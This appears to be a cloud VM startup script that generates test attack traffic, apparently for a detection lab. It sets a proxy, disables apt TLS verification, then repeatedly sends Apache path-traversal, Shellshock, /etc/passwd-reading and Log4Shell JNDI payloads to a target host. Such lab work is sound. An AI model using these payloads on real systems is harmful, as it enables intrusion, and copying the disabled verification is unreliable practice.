#! /bin/bash
sleep 150
    SWP_IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/SWP_IP" -H "Metadata-Flavor: Google")
sudo echo http_proxy=https://$SWP_IP:443/ >> /etc/environment
sudo echo https_proxy=https://$SWP_IP:443/ >> /etc/environment
sudo touch /etc/apt/apt.conf.d/proxy.conf
sudo echo "Acquire::https::Proxy \""https://$SWP_IP:443/\"";" | sudo tee /etc/apt/apt.conf.d/proxy.conf
sudo touch /etc/apt/apt.conf.d/99verify-peer.conf
sudo echo "Acquire { https::Verify-Peer false }" | sudo tee /etc/apt/apt.conf.d/99verify-peer.conf
sudo apt-get update
sudo apt-get install apache2 tcpdump iperf3 -y
sleep 1200
counter=50
    TARGET_PRIVATE_IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/TARGET_PRIVATE_IP" -H "Metadata-Flavor: Google")
while [ $counter -gt 0 ];
do
    sudo curl http://$TARGET_PRIVATE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; uname -a' --max-time 2
    sudo curl $TARGET_PRIVATE_IP/cgi-bin/user.sh -H 'FakeHeader:() { :; }; echo Content-Type: text/html; echo ; /bin/uname -a' --max-time 2
    sudo curl http://$TARGET_PRIVATE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd --max-time 2
    sudo curl -H 'User-Agent: ${jndi:ldap://123.123.123.123:8055/a}' $TARGET_PRIVATE_IP --max-time 2
    sudo curl -H 'User-Agent: ${jndi:ldap://123.123.123.123:8081/a}' http://$TARGET_PRIVATE_IP --max-time 2
    sleep 60
    ((counter--))
done
